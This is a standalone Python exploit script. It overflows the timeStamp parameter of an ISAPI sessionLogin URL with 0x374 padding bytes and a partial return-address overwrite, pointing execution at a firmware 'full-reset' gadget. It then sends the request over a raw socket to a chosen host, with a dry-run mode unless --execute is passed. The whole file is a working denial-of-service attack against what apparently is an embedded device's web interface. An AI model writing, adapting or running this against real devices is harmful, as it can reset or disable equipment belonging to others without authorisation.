#!/usr/bin/env python3
import argparse
import socket
import sys


OFFSET_TO_LR = 0x374
FULL_RESET_GADGET = 0x225713


def request_path() -> bytes:
    target = FULL_RESET_GADGET.to_bytes(4, "little")[:3]
    return b"/ISAPI/Security/sessionLogin?timeStamp=" + b"A" * OFFSET_TO_LR + target


def main() -> int:
    parser = argparse.ArgumentParser(description="Trigger the firmware-specific full-reset path")
    parser.add_argument("--host", default="192.168.20.207")
    parser.add_argument("--execute", action="store_true")
    args = parser.parse_args()

    path = request_path()
    print(f"target=0x{FULL_RESET_GADGET:08x} offset={OFFSET_TO_LR} uri_length={len(path)}")
    if not args.execute:
        print("dry run; pass --execute to send")
        return 0

    request = (
        b"POST " + path + b" HTTP/1.1\r\n"
        + b"Host: " + args.host.encode("ascii") + b"\r\n"
        + b"Content-Length: 0\r\nConnection: close\r\n\r\n"
    )
    with socket.create_connection((args.host, 80), timeout=5) as sock:
        sock.sendall(request)
        sock.settimeout(8)
        try:
            response = sock.recv(4096)
        except (TimeoutError, ConnectionResetError):
            response = b""
    print(f"response_bytes={len(response)}")
    if response:
        sys.stdout.buffer.write(response)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
